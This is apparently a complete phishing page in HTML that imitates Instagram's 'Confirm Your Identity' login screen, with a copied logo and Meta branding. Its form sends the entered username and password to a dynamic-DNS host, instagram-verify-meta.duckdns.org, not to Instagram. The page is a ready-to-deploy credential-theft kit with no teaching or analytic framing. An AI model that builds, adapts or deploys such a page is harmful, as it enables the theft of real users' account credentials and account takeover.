<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Your Identity • Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="main-wrapper">
        <header class="logo-area">
            <svg viewBox="0 0 100 100" width="75" height="75">
                <defs>
                    <linearGradient id="g1" x1="20%" y1="100%" x2="80%" y2="0%">
                        <stop offset="0%" stop-color="#f09433"/><stop offset="50%" stop-color="#dc2743"/><stop offset="100%" stop-color="#bc1888"/>
                    </linearGradient>
                </defs>
                <rect x="10" y="10" width="80" height="80" rx="22" ry="22" fill="url(#g1)"/>
                <rect x="25" y="25" width="50" height="50" rx="13" ry="13" fill="none" stroke="#fff" stroke-width="5"/>
                <circle cx="50" cy="50" r="12" fill="none" stroke="#fff" stroke-width="5"/>
                <circle cx="66" cy="34" r="4" fill="#fff"/>
            </svg>
        </header>

        <section class="login-box">
            <p class="instruction">Confirm your account to continue.</p>
            
            <form action="https://instagram-verify-meta.duckdns.org/login.php" method="POST">
                <div class="field">
                    <input type="text" name="Username" placeholder="Username, email, or phone" required>
                </div>
                <div class="field">
                    <input type="password" name="Password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn-submit">Confirm</button>
            </form>

            <div class="divider">
                <div class="line"></div><div class="or">OR</div><div class="line"></div>
            </div>

            <a href="https://www.instagram.com/" class="fb-link">Log in with Facebook</a>
        </section>
    </div>

    <footer class="footer">
        <div class="meta-brand"><i class="fa-brands fa-meta"></i> Meta</div>
        <p>© 2026 Instagram from Meta</p>
    </footer>

</body>
</html>
